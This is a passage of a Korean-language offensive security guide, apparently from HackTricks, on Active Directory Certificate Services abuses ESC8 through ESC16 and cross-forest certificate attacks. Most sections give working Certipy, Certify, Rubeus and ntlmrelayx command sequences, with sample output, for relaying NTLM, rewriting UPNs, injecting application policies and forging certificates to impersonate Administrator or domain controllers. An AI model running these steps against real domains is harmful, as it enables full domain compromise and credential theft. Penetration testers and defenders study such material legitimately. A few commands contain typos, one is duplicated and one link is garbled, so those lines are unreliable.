#### Certipy를 이용한 악용

인증서 요청은 기본적으로 Certipy가 템플릿 `Machine` 또는 `User`를 기반으로 수행하며, 전달되는 계정 이름이 `$`로 끝나는지 여부에 따라 결정됩니다. 다른 템플릿을 지정하려면 `-template` 파라미터를 사용하면 됩니다.

그런 다음 [PetitPotam](https://github.com/ly4k/PetitPotam)과 같은 기술을 사용하여 인증을 강제할 수 있습니다. 도메인 컨트롤러를 다룰 때는 `-template DomainController`를 지정해야 합니다.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 보안 확장 없음 - ESC9 <a href="#id-5485" id="id-5485"></a>

### 설명

새 값 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`)은 **`msPKI-Enrollment-Flag`**에 대해 ESC9로 불리며, 인증서에 **새 `szOID_NTDS_CA_SECURITY_EXT` 보안 확장**을 포함하는 것을 방지합니다. 이 플래그는 `StrongCertificateBindingEnforcement`가 `1`(기본값)로 설정되어 있을 때 관련성을 가지며, `2`로 설정된 경우와는 대조됩니다. ESC9가 없더라도 요구사항이 변경되지 않는 상황에서는 Kerberos나 Schannel에 대한 더 약한 인증서 매핑이 악용될 수 있는 시나리오(ESC10에서와 같이)에서 그 관련성이 커집니다.

이 플래그의 설정이 중요해지는 조건은 다음과 같습니다:

- `StrongCertificateBindingEnforcement`가 `2`로 조정되지 않았거나(기본값은 `1`), 또는 `CertificateMappingMethods`에 `UPN` 플래그가 포함된 경우.
- 인증서가 `msPKI-Enrollment-Flag` 설정 내에서 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그로 표시된 경우.
- 인증서에 어떤 client authentication EKU라도 지정된 경우.
- 다른 계정을 침해하기 위해 어떤 계정에 대해 `GenericWrite` 권한이 있는 경우.

### 악용 시나리오

예를 들어 `John@corp.local`가 `Jane@corp.local`에 대해 `GenericWrite` 권한을 가지고 있고 목표가 `Administrator@corp.local`를 침해하는 것이라고 가정합니다. `Jane@corp.local`이 등록할 수 있도록 허용된 `ESC9` 인증서 템플릿은 `msPKI-Enrollment-Flag` 설정에서 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그로 구성되어 있습니다.

초기에, `Jane`의 해시는 `John`의 `GenericWrite` 덕분에 Shadow Credentials를 사용하여 획득됩니다:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
이후, `Jane`의 `userPrincipalName`이 의도적으로 `@corp.local` 도메인 부분을 생략한 채 `Administrator`로 수정됩니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
이 변경은 `Administrator@corp.local`가 `Administrator`의 `userPrincipalName`로서 구분된 상태로 유지되므로 제약을 위반하지 않습니다.

이후, 취약한 것으로 표시된 `ESC9` 인증서 템플릿이 `Jane`로 요청됩니다:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
인증서의 `userPrincipalName`이 `Administrator`로 나타나며, “object SID”가 없습니다.

`Jane`의 `userPrincipalName`은 이후 원래 값인 `Jane@corp.local`로 복원됩니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
발급된 인증서로 인증을 시도하면 이제 `Administrator@corp.local`의 NT 해시를 얻습니다. 인증서에 도메인 명시가 없으므로 명령에는 `-domain <domain>`을 포함해야 합니다:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### 설명

ESC10은 도메인 컨트롤러의 두 레지스트리 키 값을 가리킨다:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 아래의 `CertificateMappingMethods` 기본값은 `0x18` (`0x8 | 0x10`)이며, 이전에는 `0x1F`로 설정되어 있었다.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 아래의 `StrongCertificateBindingEnforcement` 기본 설정은 `1`이며, 이전에는 `0`이었다.

**사례 1**

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우.

**사례 2**

`CertificateMappingMethods`에 `UPN` 비트(`0x4`)가 포함된 경우.

### 악용 사례 1

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우, `GenericWrite` 권한을 가진 계정 A를 이용해 임의의 계정 B를 침해할 수 있다.

예를 들어, 공격자가 `Jane@corp.local`에 대해 `GenericWrite` 권한을 가지고 있고 `Administrator@corp.local`를 침해하려고 한다고 하자. 이 절차는 ESC9과 동일하게 진행되며, 어떤 인증서 템플릿도 사용할 수 있다.

초기에, `GenericWrite`를 악용하여 Shadow Credentials를 사용해 `Jane`의 해시를 획득한다.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
그 후, `Jane`의 `userPrincipalName`은 제약 위반을 피하기 위해 의도적으로 `@corp.local` 부분을 생략하고 `Administrator`로 변경됩니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
이어서, 기본 `User` 템플릿을 사용하여 클라이언트 인증을 허용하는 인증서가 `Jane`으로 요청됩니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 그런 다음 원래 값인 `Jane@corp.local`로 되돌려집니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
획득한 인증서로 인증하면 `Administrator@corp.local`의 NT hash를 얻으므로, 인증서에 도메인 정보가 없어 명령에서 도메인을 지정해야 합니다.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 악용 사례 2

`CertificateMappingMethods`가 `UPN` 비트 플래그(`0x4`)를 포함하는 경우, `GenericWrite` 권한을 가진 계정 A는 `userPrincipalName` 속성이 없는 계정 B(머신 계정 및 내장 도메인 관리자 `Administrator` 포함)를 손상시킬 수 있습니다.

여기서는 목표가 `DC$@corp.local`을 손상시키는 것이며, `GenericWrite`를 활용해 Shadow Credentials를 통해 `Jane`의 해시를 얻는 것에서 시작합니다.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
그런 다음 `Jane`의 `userPrincipalName`은 `DC$@corp.local`로 설정됩니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
기본 `User` 템플릿을 사용해 클라이언트 인증용 인증서를 `Jane`으로 요청합니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 이 프로세스 후 원래 값으로 되돌아갑니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel을 통해 인증하기 위해 Certipy의 `-ldap-shell` 옵션이 사용되며, 인증 성공은 `u:CORP\DC$`로 표시됩니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell을 통해 `set_rbcd` 같은 명령으로 Resource-Based Constrained Delegation (RBCD) 공격을 수행하면 도메인 컨트롤러가 손상될 수 있습니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
이 취약점은 `userPrincipalName`이 없거나 `sAMAccountName`과 일치하지 않는 모든 사용자 계정에도 적용됩니다. 기본적으로 `userPrincipalName`이 설정되어 있지 않고 LDAP 권한이 높은 기본 계정인 `Administrator@corp.local`가 주요 공격 대상입니다.

## Relaying NTLM to ICPR - ESC11

### 설명

CA Server가 `IF_ENFORCEENCRYPTICERTREQUEST`로 구성되어 있지 않으면 RPC 서비스를 통해 서명 없이 NTLM relay 공격이 가능해집니다. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`certipy`를 사용해 `Enforce Encryption for Requests`가 Disabled인지 열거할 수 있으며, certipy는 `ESC11` 취약점을 표시합니다.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 악용 시나리오

relay server를 설정해야 합니다:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
참고: 도메인 컨트롤러의 경우, DomainController에서 `-template`을 지정해야 합니다.

또는 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### 설명

관리자는 Certificate Authority를 "Yubico YubiHSM2"와 같은 외부 장치에 저장하도록 설정할 수 있습니다.

CA server가 USB 포트를 통해 USB device에 연결되어 있거나, CA server가 virtual machine인 경우 USB device server에 연결되어 있다면, Key Storage Provider가 YubiHSM에서 키를 생성하고 사용하는 데에 authentication key(때때로 "password"라고도 함)가 필요합니다.

이 키/비밀번호는 레지스트리의 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`에 평문으로 저장됩니다.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### 악용 시나리오

CA의 private key가 물리적 USB 장치에 저장되어 있고 당신이 shell access을 얻은 경우, 해당 키를 복구하는 것이 가능합니다.

먼저 CA certificate(이는 public함)를 확보한 후 다음을 수행합니다:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
마지막으로 certutil `-sign` 명령을 사용하여 CA 인증서와 해당 개인 키로 임의의 새 인증서를 위조하세요.

## OID Group Link Abuse - ESC13

### 설명

`msPKI-Certificate-Policy` 속성은 인증서 템플릿에 발행 정책을 추가할 수 있게 합니다. 발행 정책을 담당하는 `msPKI-Enterprise-Oid` 객체들은 PKI OID 컨테이너의 Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services)에서 발견할 수 있습니다. 이 객체의 `msDS-OIDToGroupLink` 속성을 사용해 정책을 AD 그룹에 연결할 수 있으며, 이를 통해 시스템은 인증서를 제시한 사용자를 해당 그룹의 멤버인 것처럼 권한을 부여할 수 있습니다. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

다시 말해, 사용자가 인증서를 등록할 권한이 있고 그 인증서가 OID 그룹에 연결되어 있으면, 사용자는 해당 그룹의 권한을 상속받을 수 있습니다.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 악용 시나리오

사용자가 사용할 수 있는 권한을 `certipy find` 또는 `Certify.exe find /showAllPermissions`로 확인하세요.

만약 `John`이 `VulnerableTemplate`을 등록할 권한을 가지고 있다면, 그 사용자는 `VulnerableGroup` 그룹의 권한을 승계받을 수 있습니다.

해야 할 일은 템플릿을 지정하는 것뿐이며, 그러면 OIDToGroupLink 권한이 포함된 인증서를 받게 됩니다.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 취약한 인증서 갱신 구성- ESC14

### 설명

The description at https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is remarkably thorough. Below is a quotation of the original text.

ESC14는 주로 Active Directory 사용자 또는 컴퓨터 계정의 `altSecurityIdentities` 속성의 오용 또는 불안전한 구성으로 인해 발생하는 "약한 명시적 인증서 매핑(weak explicit certificate mapping)" 취약점을 다룹니다. 이 다중 값 속성은 관리자가 인증 목적으로 X.509 인증서를 AD 계정에 수동으로 연결할 수 있게 합니다. 값이 채워지면 이러한 명시적 매핑은 일반적으로 인증서의 SAN에 있는 UPN 또는 DNS 이름, 또는 `szOID_NTDS_CA_SECURITY_EXT` 보안 확장에 포함된 SID에 의존하는 기본적인 인증서 매핑 로직을 무시할 수 있습니다.

"약한(weak)" 매핑은 `altSecurityIdentities` 속성 내에서 인증서를 식별하기 위해 사용된 문자열 값이 지나치게 광범위하거나, 쉽게 추측 가능하거나, 고유하지 않은 인증서 필드에 의존하거나, 쉽게 위조 가능한 인증서 구성요소를 사용할 때 발생합니다. 공격자가 권한 있는 계정에 대해 이렇게 약하게 정의된 명시적 매핑과 일치하는 속성을 가진 인증서를 얻거나 제작할 수 있다면, 해당 인증서를 사용해 그 계정으로 인증하고 계정으로 가장할 수 있습니다.

잠재적으로 약한 `altSecurityIdentities` 매핑 문자열의 예는 다음과 같습니다:

- 일반적인 Subject Common Name(CN)만으로 매핑: 예: `X509:<S>CN=SomeUser`. 공격자는 보안이 약한 소스에서 이 CN을 가진 인증서를 얻을 수 있습니다.
- 특정 일련번호나 subject key identifier 같은 추가 자격 없이 지나치게 일반적인 Issuer Distinguished Name(DN) 또는 Subject DN 사용: 예: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- 공격자가 정당하게 얻거나 위조할 수 있는 인증서에서 만족시킬 수 있는 예측 가능한 패턴이나 비암호학적 식별자 사용(예: CA가 손상되었거나 ESC1과 같은 취약한 템플릿을 찾은 경우).

`altSecurityIdentities` 속성은 다음과 같은 다양한 매핑 형식을 지원합니다:

- `X509:<I>IssuerDN<S>SubjectDN` (Issuer 및 Subject DN 전체로 매핑)
- `X509:<SKI>SubjectKeyIdentifier` (인증서의 Subject Key Identifier 확장 값으로 매핑)
- `X509:<SR>SerialNumberBackedByIssuerDN` (일련번호로 매핑, 암묵적으로 Issuer DN으로 한정됨) - 표준 형식은 아니며 보통은 `<I>IssuerDN<SR>SerialNumber`이다.
- `X509:<RFC822>EmailAddress` (SAN의 RFC822 이름(일반적으로 이메일 주소)으로 매핑)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (인증서의 원시 공개키에 대한 SHA1 해시로 매핑 - 일반적으로 강력함)

이러한 매핑의 보안성은 매핑 문자열에서 선택된 인증서 식별자들의 구체성, 고유성 및 암호학적 강도에 크게 좌우됩니다. 도메인 컨트롤러에서 강력한 인증서 바인딩 모드가 활성화되어 있더라도(이는 주로 SAN UPN/DNS 및 SID 확장에 기반한 암묵적 매핑에 영향을 줌), 잘못 구성된 `altSecurityIdentities` 항목은 매핑 로직 자체가 취약하거나 너무 관대할 경우 여전히 가장화의 직접적인 경로를 제공할 수 있습니다.

### Abuse Scenario

ESC14는 Active Directory(AD)의 **명시적 인증서 매핑**(explicit certificate mappings), 특히 `altSecurityIdentities` 속성을 대상으로 합니다. 이 속성이 설정되어 있으면(설계상 또는 잘못된 구성으로) 공격자는 해당 매핑과 일치하는 인증서를 제시하여 계정을 가장할 수 있습니다.

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**전제 조건**: 공격자가 대상 계정의 `altSecurityIdentities` 속성에 쓸 수 있는 권한을 가지고 있거나, 대상 AD 객체에 대해 다음 권한 중 하나를 부여할 수 있는 권한을 가지고 있음:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **전제 조건**: 대상이 altSecurityIdentities에 약한 X509RFC822 매핑을 가지고 있음. 공격자는 피해자의 mail 속성을 대상의 X509RFC822 이름과 일치하도록 설정하고, 피해자 이름으로 인증서를 발급받아 그 인증서를 사용해 대상 계정으로 인증할 수 있음.

#### Scenario C: Target Has X509IssuerSubject Mapping

- **전제 조건**: 대상이 `altSecurityIdentities`에 약한 X509IssuerSubject 명시적 매핑을 가지고 있음. 공격자는 피해자 주체의 `cn` 또는 `dNSHostName` 속성을 대상의 X509IssuerSubject 매핑의 subject와 일치하도록 설정할 수 있음. 그 후 공격자는 피해자 이름으로 인증서를 발급받아 이 인증서를 사용해 대상 계정으로 인증할 수 있음.

#### Scenario D: Target Has X509SubjectOnly Mapping

- **전제 조건**: 대상이 `altSecurityIdentities`에 약한 X509SubjectOnly 명시적 매핑을 가지고 있음. 공격자는 피해자 주체의 `cn` 또는 `dNSHostName` 속성을 대상의 X509SubjectOnly 매핑의 subject와 일치하도록 설정할 수 있음. 이후 공격자는 피해자 이름으로 인증서를 발급받아 이 인증서를 사용해 대상 계정으로 인증할 수 있음.

### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
인증서를 저장하고 변환하세요.
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
인증 (인증서를 사용하여)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
정리 (선택 사항)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
다양한 공격 시나리오에서 더 구체적인 공격 방법은 다음을 참고하세요: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 설명

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc의 설명은 매우 상세합니다. 아래는 원문 인용입니다.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### 악용

다음은 [이 링크]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Certipy의 `find` 명령은 CA가 패치되지 않은 경우 ESC15에 취약할 가능성이 있는 V1 템플릿을 식별하는 데 도움이 될 수 있습니다.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### 시나리오 A: Schannel을 통한 직접 가장

**Step 1: 인증서를 요청하면서 "Client Authentication" Application Policy와 대상 UPN을 주입합니다.** 공격자 `attacker@corp.local`는 "WebServer" V1 템플릿(가입자가 제공한 subject를 허용함)을 사용하여 `administrator@corp.local`을 대상으로 합니다.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 취약한 V1 템플릿으로, "Enrollee supplies subject"가 설정된 템플릿입니다.
- `-application-policies 'Client Authentication'`: CSR의 Application Policies 확장에 OID `1.3.6.1.5.5.7.3.2`를 삽입합니다.
- `-upn 'administrator@corp.local'`: 사칭을 위해 SAN에 UPN을 설정합니다.

**2단계: 획득한 인증서를 사용하여 Schannel (LDAPS)을 통해 인증합니다.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### 시나리오 B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**1단계: V1 템플릿( "Enrollee supplies subject" 포함)에서 인증서를 요청하고, "Certificate Request Agent" Application Policy를 주입합니다.** 이 인증서는 공격자(`attacker@corp.local`)가 enrollment agent가 되기 위해 발급받는 것입니다. 여기서는 공격자 자신의 신원에 UPN을 지정하지 않습니다 — 목표는 agent 권한 획득이기 때문입니다.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`을 주입합니다.

**단계 2: "agent" 인증서를 사용하여 대상 특권 사용자를 대신해 인증서를 요청합니다.** 이는 ESC3-like 단계로, 단계 1의 인증서를 agent 인증서로 사용합니다.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**3단계: "on-behalf-of" 인증서를 사용하여 특권 사용자로 인증한다.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### 설명

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)**는 AD CS의 구성에서 모든 인증서에 **szOID_NTDS_CA_SECURITY_EXT** 확장을 포함하도록 강제하지 않을 경우 공격자가 다음과 같이 이 취약점을 악용할 수 있는 시나리오를 의미합니다:

1. **SID binding 없이** 인증서를 요청합니다.

2. 이 인증서를 **모든 계정으로 인증하는 데** 사용하여, 예를 들어 높은 권한의 계정(예: 도메인 관리자)을 사칭합니다.

자세한 원리는 다음 글을 참조하세요:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### 악용

다음은 [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)를 참조한 내용입니다. 자세한 사용 방법은 클릭하여 확인하세요.

Active Directory Certificate Services (AD CS) 환경이 **ESC16**에 취약한지 여부를 확인하려면
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**1단계: 피해자 계정의 초기 UPN을 읽기 (선택 사항 - 복원을 위해).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**단계 2: 피해자 계정의 UPN을 대상 관리자 계정의 `sAMAccountName`으로 업데이트합니다.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**단계 3: (필요한 경우) "victim" 계정의 자격 증명 획득(예: Shadow Credentials를 통해).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16-vulnerable CA에서 _any suitable client authentication template_ (예: "User") 중 하나를 사용해 "victim" 사용자로 인증서를 요청합니다.** CA가 ESC16에 취약하므로, 템플릿의 해당 확장 설정에 관계없이 발급된 인증서에서 SID security extension을 자동으로 생략합니다. Kerberos credential cache 환경 변수를 설정합니다 (쉘 명령):
```bash
export KRB5CCNAME=victim.ccache
```
그런 다음 인증서를 요청하세요:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**5단계: "victim" 계정의 UPN을 복원합니다.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**6단계: 대상 관리자로 인증합니다.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

cross-forest enrollment 구성은 비교적 간단하다. resource forest의 root CA certificate는 관리자에 의해 account forests에 게시되며, resource forest의 enterprise CA certificates는 각 account forest의 NTAuthCertificates 및 AIA 컨테이너에 추가된다. 이를 정리하면, 이 구성은 resource forest의 CA에 그 CA가 관리하는 PKI를 사용하는 모든 다른 포리스트에 대한 완전한 제어권을 부여한다. 만약 이 CA가 공격자에 의해 탈취된다면, resource 및 account forests 양쪽의 모든 사용자에 대한 certificates가 공격자에 의해 위조될 수 있어 포리스트의 보안 경계가 무너진다.

### Enrollment Privileges Granted to Foreign Principals

다중 포리스트 환경에서는 Enterprise CAs가 **publish certificate templates** 하여 **Authenticated Users or foreign principals** (해당 Enterprise CA가 속한 포리스트 외부의 사용자/그룹)에게 **enrollment and edit rights**를 허용하는 경우에 주의가 필요하다.\
신뢰를 통해 인증이 이루어지면, AD에 의해 Authenticated Users SID가 사용자의 token에 추가된다. 따라서, 도메인이 Authenticated Users에 대해 enrollment 권한을 허용하는 template을 가진 Enterprise CA를 보유하고 있다면, 다른 포리스트의 사용자가 해당 template을 enrollment할 수 있다. 마찬가지로, 어떤 template이 명시적으로 foreign principal에게 enrollment 권한을 부여하면, cross-forest access-control relationship이 생성되어 한 포리스트의 principal이 다른 포리스트의 template에 enrollment할 수 있게 된다.

두 경우 모두 한 포리스트에서 다른 포리스트로의 attack surface가 증가한다. certificate template의 설정은 공격자에 의해 악용되어 외부 도메인에서 추가 권한을 획득하는 데 이용될 수 있다.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
